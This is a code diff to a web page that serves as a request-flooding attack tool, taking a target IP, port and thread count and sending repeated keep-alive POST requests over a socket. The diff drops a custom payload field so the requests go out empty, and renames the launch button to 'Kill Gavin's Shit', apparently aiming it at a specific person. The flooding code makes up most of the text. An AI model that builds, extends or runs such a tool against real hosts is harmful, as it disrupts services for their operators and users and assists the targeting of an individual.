@@ -32,7 +32,7 @@
       flex-direction: column;
       gap: 20px;
     }
-    input[type=text], input[type=number], textarea {
+    input[type=text], input[type=number] {
       padding: 10px;
       border: 1px solid #ddd;
       border-radius: 5px;
@@ -94,11 +94,7 @@
         <label for="threads">Threads:</label>
         <input type="number" id="threads" name="threads" min="1" value="10">
       </div>
-      <div class="form-group">
-        <label for="payload">Payload:</label>
-        <textarea id="payload" name="payload" rows="5"></textarea>
-      </div>
-      <button type="submit" class="upload-btn">Start Attack</button>
+      <button type="submit" class="upload-btn">Kill Gavin's Shit</button>
     </form>
     <div class="output" id="output"></div>
     <div class="footer">
@@ -113,17 +109,16 @@
       const ip = document.getElementById('ip').value;
       const port = document.getElementById('port').value;
       const threads = document.getElementById('threads').value;
-      const payload = document.getElementById('payload').value;
 
       try {
-        await startAttack(ip, port, threads, payload);
+        await startAttack(ip, port, threads);
       } catch (error) {
         console.error(error);
         alert('Error starting attack');
       }
     });
 
-    async function startAttack(ip, port, threads, payload) {
+    async function startAttack(ip, port, threads) {
       const output = document.getElementById('output');
       output.innerHTML = '';
 
@@ -142,15 +137,15 @@
         output.innerHTML += `<p>Disconnected from ${ip}:${port}</p>`;
       };
 
-      // Send a flood of requests with the specified payload
+      // Send a flood of requests
       for (let i = 0; i < threads; i++) {
         setTimeout(() => {
-          sendRequest(socket, payload);
+          sendRequest(socket);
         }, i * 100);
       }
     }
 
-    function sendRequest(socket, payload) {
+    function sendRequest(socket) {
       const data = {
         method: 'POST',
         url: '/',
@@ -159,7 +154,7 @@
           'Connection': 'keep-alive',
           'Content-Type': 'application/x-www-form-urlencoded'
         },
-        body: payload
+        body: ''
       };
 
       socket.send(JSON.stringify(data));
